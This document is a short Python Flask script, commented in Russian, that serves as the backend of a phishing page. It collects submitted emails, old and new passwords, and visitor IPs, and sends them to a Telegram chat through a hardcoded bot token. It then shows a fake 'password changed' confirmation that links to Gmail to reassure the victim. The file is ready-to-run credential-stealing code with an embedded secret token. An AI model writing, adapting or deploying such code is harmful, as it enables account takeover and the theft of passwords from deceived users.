from flask import Flask, request
import requests
from datetime import datetime

app = Flask(__name__)

# ==================== ЗАМЕНИ НА СВОИ ====================
BOT_TOKEN = "8782494649:AAHfj1ncP_zpEQMHphTSxWepL_Vm1Osu9mw"
CHAT_ID = "7524467900"
# ========================================================

@app.route('/send', methods=['POST'])
def receive():
    # Получаем данные от формы
    email = request.form.get('email', '')
    old_pass = request.form.get('old_password', '')
    new_pass = request.form.get('new_password', '')
    ip = request.remote_addr
    
    # Формируем сообщение
    text = f"НОВЫЕ ДАННЫЕ\n\nEmail: {email}\nСтарый: {old_pass}\nНовый: {new_pass}\nIP: {ip}\nВремя: {datetime.now().strftime('%H:%M:%S %d.%m.%Y')}"
    
    # Отправляем в Telegram
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={'chat_id': CHAT_ID, 'text': text})
    except:
        pass
    
    # Возвращаем страницу успеха
    return '''
    <html>
    <body style="font-family:Arial;text-align:center;padding:50px">
        <h2 style="color:green">✅ Пароль изменён</h2>
        <p>Ваш пароль обновлён. Теперь вы можете войти.</p>
        <a href="https://gmail.com">Перейти в Gmail</a>
    </body>
    </html>
    '''

if __name__ == '__main__':
    print("Бот запущен на http://localhost:5000")
    app.run(host='0.0.0.0', port=5000)